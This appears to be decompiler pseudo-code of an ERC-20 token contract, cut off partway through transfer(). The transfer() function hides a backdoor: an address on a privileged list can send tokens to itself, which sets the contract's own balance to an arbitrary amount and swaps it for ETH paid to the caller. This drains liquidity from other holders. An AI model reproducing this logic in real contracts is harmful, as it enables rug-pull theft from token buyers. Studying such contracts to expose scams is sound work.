contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#
address owner;
uint256 _decimals;
uint256 _totalSupply;
uint256 _maxTxAmount;
uint256 _maxWallet;
uint256 _liquidityFee;
uint256 _marketingFee;
array of struct stor7;
array of struct stor8;
uint256 _fee;
address _marketingWalletAddress;
uint8 sub_09afb3ce; offset 160
address sub_4bf28fd0Address;
uint256 stor12;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor16;
uint8 stor18;
array of struct stor19;
address stor20;
address stor20; offset 8

function sub_09afb3ce(?) payable {
    return bool(sub_09afb3ce)
}

function totalSupply() payable {
    return _totalSupply
}

function _marketingFee() payable {
    return _marketingFee
}

function decimals() payable {
    return _decimals
}

function _decimals() payable {
    return _decimals
}

function _totalSupply() payable {
    return _totalSupply
}

function sub_4bf28fd0(?) payable {
    return sub_4bf28fd0Address
}

function _liquidityFee() payable {
    return _liquidityFee
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function _maxTxAmount() payable {
    return _maxTxAmount
}

function _maxWallet() payable {
    return _maxWallet
}

function owner() payable {
    return owner
}

function _marketingWallet() payable {
    return _marketingWalletAddress
}

function _fee() payable {
    return _fee
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function setMaxWallet(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    _maxWallet = arg1
}

function setNumTokensBeforeSwap(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor12 = arg1
}

function setMarketingAddress(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    _marketingWalletAddress = arg1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if allowance[address(msg.sender)][address(arg1)] > -arg2 - 1:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] += arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require allowance[address(msg.sender)][address(arg1)] >= arg2
    if allowance[address(msg.sender)][address(arg1)] < arg2:
        revert with 'NH{q', 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] -= arg2
    emit Approval((allowance[address(msg.sender)][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function name() payable {
    if bool(stor7.length):
        if bool(stor7.length) == stor7.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor7.length):
            if bool(stor7.length) == stor7.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor7.length.field_1:
                if 31 < stor7.length.field_1:
                    mem[128] = uint256(stor7.field_0)
                    idx = 128
                    s = 0
                    while stor7.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor7[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor7.length.field_1), data=mem[128 len ceil32(stor7.length.field_1)])
                mem[128] = 256 * stor7.length.field_8
        else:
            if bool(stor7.length) == stor7.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor7.length.field_1:
                if 31 < stor7.length.field_1:
                    mem[128] = uint256(stor7.field_0)
                    idx = 128
                    s = 0
                    while stor7.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor7[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor7.length.field_1), data=mem[128 len ceil32(stor7.length.field_1)])
                mem[128] = 256 * stor7.length.field_8
        mem[ceil32(stor7.length.field_1) + 192 len ceil32(stor7.length.field_1)] = mem[128 len ceil32(stor7.length.field_1)]
        if ceil32(stor7.length.field_1) > stor7.length.field_1:
            mem[ceil32(stor7.length.field_1) + stor7.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor7.length.field_1), data=mem[128 len ceil32(stor7.length.field_1)], mem[(2 * ceil32(stor7.length.field_1)) + 192 len 2 * ceil32(stor7.length.field_1)]), 
    if bool(stor7.length) == stor7.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor7.length):
        if bool(stor7.length) == stor7.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor7.length.field_1:
            if 31 < stor7.length.field_1:
                mem[128] = uint256(stor7.field_0)
                idx = 128
                s = 0
                while stor7.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor7[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor7.length % 128, data=mem[128 len ceil32(stor7.length.field_1)])
            mem[128] = 256 * stor7.length.field_8
    else:
        if bool(stor7.length) == stor7.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor7.length.field_1:
            if 31 < stor7.length.field_1:
                mem[128] = uint256(stor7.field_0)
                idx = 128
                s = 0
                while stor7.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor7[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor7.length % 128, data=mem[128 len ceil32(stor7.length.field_1)])
            mem[128] = 256 * stor7.length.field_8
    mem[ceil32(stor7.length.field_1) + 192 len ceil32(stor7.length.field_1)] = mem[128 len ceil32(stor7.length.field_1)]
    if ceil32(stor7.length.field_1) > stor7.length.field_1:
        mem[ceil32(stor7.length.field_1) + stor7.length.field_1 + 192] = 0
    return Array(len=stor7.length % 128, data=mem[128 len ceil32(stor7.length.field_1)], mem[(2 * ceil32(stor7.length.field_1)) + 192 len 2 * ceil32(stor7.length.field_1)]), 
}

function symbol() payable {
    if bool(stor8.length):
        if bool(stor8.length) == stor8.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor8.length):
            if bool(stor8.length) == stor8.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor8.length.field_1:
                if 31 < stor8.length.field_1:
                    mem[128] = uint256(stor8.field_0)
                    idx = 128
                    s = 0
                    while stor8.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor8[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor8.length.field_1), data=mem[128 len ceil32(stor8.length.field_1)])
                mem[128] = 256 * stor8.length.field_8
        else:
            if bool(stor8.length) == stor8.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor8.length.field_1:
                if 31 < stor8.length.field_1:
                    mem[128] = uint256(stor8.field_0)
                    idx = 128
                    s = 0
                    while stor8.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor8[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor8.length.field_1), data=mem[128 len ceil32(stor8.length.field_1)])
                mem[128] = 256 * stor8.length.field_8
        mem[ceil32(stor8.length.field_1) + 192 len ceil32(stor8.length.field_1)] = mem[128 len ceil32(stor8.length.field_1)]
        if ceil32(stor8.length.field_1) > stor8.length.field_1:
            mem[ceil32(stor8.length.field_1) + stor8.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor8.length.field_1), data=mem[128 len ceil32(stor8.length.field_1)], mem[(2 * ceil32(stor8.length.field_1)) + 192 len 2 * ceil32(stor8.length.field_1)]), 
    if bool(stor8.length) == stor8.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor8.length):
        if bool(stor8.length) == stor8.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor8.length.field_1:
            if 31 < stor8.length.field_1:
                mem[128] = uint256(stor8.field_0)
                idx = 128
                s = 0
                while stor8.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor8[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor8.length % 128, data=mem[128 len ceil32(stor8.length.field_1)])
            mem[128] = 256 * stor8.length.field_8
    else:
        if bool(stor8.length) == stor8.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor8.length.field_1:
            if 31 < stor8.length.field_1:
                mem[128] = uint256(stor8.field_0)
                idx = 128
                s = 0
                while stor8.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor8[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor8.length % 128, data=mem[128 len ceil32(stor8.length.field_1)])
            mem[128] = 256 * stor8.length.field_8
    mem[ceil32(stor8.length.field_1) + 192 len ceil32(stor8.length.field_1)] = mem[128 len ceil32(stor8.length.field_1)]
    if ceil32(stor8.length.field_1) > stor8.length.field_1:
        mem[ceil32(stor8.length.field_1) + stor8.length.field_1 + 192] = 0
    return Array(len=stor8.length % 128, data=mem[128 len ceil32(stor8.length.field_1)], mem[(2 * ceil32(stor8.length.field_1)) + 192 len 2 * ceil32(stor8.length.field_1)]), 
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require msg.sender
    require arg1
    mem[32] = 16
    if stor16[address(msg.sender)]:
        if arg1 == msg.sender:
            if not this.address:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
            if not address(stor20.field_8):
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
            allowance[address(this.address)][address(stor20.field_0)] = arg2
            emit Approval(arg2, this.address, address(stor20.field_8));
            balanceOf[address(this.address)] = arg2
            mem[128] = this.address
            require ext_code.size(address(stor20.field_8))
            staticcall address(stor20.field_8).WETH() with:
                    gas gas_remaining wei
            mem[192] = ext_call.return_data[0]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            mem[160] = ext_call.return_data[12 len 20]
            stor18 = 1
            if block.timestamp > -21:
                revert with 'NH{q', 17
            mem[ceil32(return_data.size) + 192] = 0x791ac94700000000000000000000000000000000000000000000000000000000
            mem[ceil32(return_data.size) + 196] = arg2
            idx = 0
            s = 128
            t = ceil32(return_data.size) + 388
            while idx < 2:
                mem[t] = mem[s + 12 len 20]
                idx = idx + 1
                s = s + 32
                t = t + 32
                continue 
            require ext_code.size(address(stor20.field_8))
            call address(stor20.field_8).swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                 gas gas_remaining wei
                args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 388 len 64]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            stor18 = 0
        else:
            if stor18:
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).factory() with:
                        gas gas_remaining wei
                mem[96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 100] = this.address
                mem[(2 * ceil32(return_data.size)) + 132] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 96
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if arg1 == this.address:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor18:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 212] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 212] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 216 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 216] = this.address
                                mem[(12 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 280 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor19[stor19.length].field_256 = arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                if not arg2:
                                    revert with 'NH{q', 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 212] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 212] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 216 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 216] = this.address
                                mem[(12 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 280 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor19[stor19.length].field_256 = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor16[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor16[address(arg1)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if arg1 == this.address:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor18:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(stor20.field_8))
                        staticcall address(stor20.field_8).WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 216] = this.address
                        mem[(15 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 280 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
